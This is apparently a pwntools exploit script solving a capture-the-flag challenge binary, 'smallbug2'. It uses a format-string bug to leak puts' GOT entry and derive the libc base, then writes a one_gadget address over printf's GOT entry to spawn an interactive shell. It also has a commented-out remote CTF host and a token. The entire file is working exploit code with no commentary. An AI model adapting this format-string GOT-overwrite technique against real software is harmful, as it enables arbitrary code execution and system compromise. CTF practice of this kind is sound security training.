from pwn import *

context.log_level='debug'
p=process("./smallbug2")
#p=remote("ctfgame.acdxvfsvd.net",11003)
#p.sendlineafter("Your Token:","50llRDHlw2UkO1aAZTemJAae6dBGdTgD")
e=ELF("./smallbug2")
p.recvuntil("?  \n=========================\n")
p.sendline("%7$saaaa"+p64(e.got['puts']))
addr=u64(p.recv(6)+"\x00\x00")-0x6f690
one_gadget=addr+0xf02a4
#gdb.attach(p)
print hex(addr)
print hex(one_gadget)
payload="%"+str((one_gadget>>16)&0xff)+"c%9$hhn"+"%"+str((one_gadget&0xffff)-((one_gadget>>16)&0xff))+"c%10$hn"
p.sendline(payload.ljust(24,"a")+p64(e.got['printf']+2)+p64(e.got['printf']))
#gdb.attach(p)
p.interactive()
